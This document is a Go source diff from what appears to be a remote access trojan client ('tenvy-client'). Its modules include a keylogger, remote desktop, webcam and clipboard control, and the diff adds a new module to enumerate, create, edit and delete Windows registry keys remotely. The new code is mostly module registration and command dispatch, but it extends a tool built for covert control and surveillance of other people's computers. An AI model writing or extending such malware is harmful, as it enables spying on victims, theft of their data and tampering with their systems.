@@ -19,10 +19,11 @@ import (
 	keyloggerctrl "github.com/rootbay/tenvy-client/internal/modules/control/keylogger"
 	remotedesktop "github.com/rootbay/tenvy-client/internal/modules/control/remotedesktop"
 	webcamctrl "github.com/rootbay/tenvy-client/internal/modules/control/webcam"
-	clipboard "github.com/rootbay/tenvy-client/internal/modules/management/clipboard"
-	filemanager "github.com/rootbay/tenvy-client/internal/modules/management/filemanager"
-	taskmanager "github.com/rootbay/tenvy-client/internal/modules/management/taskmanager"
-	tcpconnections "github.com/rootbay/tenvy-client/internal/modules/management/tcpconnections"
+        clipboard "github.com/rootbay/tenvy-client/internal/modules/management/clipboard"
+        filemanager "github.com/rootbay/tenvy-client/internal/modules/management/filemanager"
+        registrymgr "github.com/rootbay/tenvy-client/internal/modules/management/registry"
+        taskmanager "github.com/rootbay/tenvy-client/internal/modules/management/taskmanager"
+        tcpconnections "github.com/rootbay/tenvy-client/internal/modules/management/tcpconnections"
 	clientchat "github.com/rootbay/tenvy-client/internal/modules/misc/clientchat"
 	notes "github.com/rootbay/tenvy-client/internal/modules/notes"
 	recovery "github.com/rootbay/tenvy-client/internal/modules/operations/recovery"
@@ -270,8 +271,9 @@ func newDefaultModuleManager() *moduleManager {
 	registry.register(newKeyloggerModule())
 	registry.register(newWebcamModule())
 	registry.register(newClipboardModule())
-	registry.register(newFileManagerModule())
-	registry.register(newTaskManagerModule())
+        registry.register(newFileManagerModule())
+        registry.register(newRegistryModule())
+        registry.register(newTaskManagerModule())
 	registry.register(newTCPConnectionsModule())
 	registry.register(newClientChatModule())
 	registry.register(&recoveryModule{})
@@ -2128,9 +2130,9 @@ func (m *clipboardModule) Shutdown(context.Context) error {
 }
 
 type fileManagerModule struct {
-	manager    *filemanager.Manager
-	extensions *moduleExtensionState
-	extOnce    sync.Once
+        manager    *filemanager.Manager
+        extensions *moduleExtensionState
+        extOnce    sync.Once
 }
 
 func (m *fileManagerModule) Metadata() ModuleMetadata {
@@ -2228,8 +2230,74 @@ func (m *fileManagerModule) Handle(ctx context.Context, cmd protocol.Command) er
 }
 
 func (m *fileManagerModule) Shutdown(context.Context) error {
-	// no teardown required for file system operations today
-	return nil
+        // no teardown required for file system operations today
+        return nil
+}
+
+type registryModule struct {
+        manager *registrymgr.Manager
+}
+
+func newRegistryModule() Module {
+        return &registryModule{}
+}
+
+func (m *registryModule) Metadata() ModuleMetadata {
+        return ModuleMetadata{
+                ID:          "registry",
+                Title:       "Registry Manager",
+                Description: "Inspect and modify the Windows registry remotely.",
+                Commands:    []string{"registry"},
+                Capabilities: []ModuleCapability{
+                        {
+                                ID:          "registry.inspect",
+                                Name:        "registry.inspect",
+                                Description: "Enumerate registry hives, keys, and values.",
+                        },
+                        {
+                                ID:          "registry.modify",
+                                Name:        "registry.modify",
+                                Description: "Create, edit, and delete registry keys and values.",
+                        },
+                },
+        }
+}
+
+func (m *registryModule) ID() string {
+        return "registry"
+}
+
+func (m *registryModule) Init(_ context.Context, cfg Config) error {
+        return m.configure(cfg)
+}
+
+func (m *registryModule) UpdateConfig(cfg Config) error {
+        return m.configure(cfg)
+}
+
+func (m *registryModule) configure(cfg Config) error {
+        if m.manager == nil {
+                m.manager = registrymgr.NewManager(cfg.Logger)
+                return nil
+        }
+        m.manager.UpdateLogger(cfg.Logger)
+        return nil
+}
+
+func (m *registryModule) Handle(ctx context.Context, cmd protocol.Command) error {
+        if m.manager == nil {
+                return WrapCommandResult(protocol.CommandResult{
+                        CommandID:   cmd.ID,
+                        Success:     false,
+                        Error:       "registry subsystem not initialized",
+                        CompletedAt: time.Now().UTC().Format(time.RFC3339Nano),
+                })
+        }
+        return WrapCommandResult(m.manager.HandleCommand(ctx, cmd))
+}
+
+func (m *registryModule) Shutdown(context.Context) error {
+        return nil
 }
 
 type taskManagerModule struct {
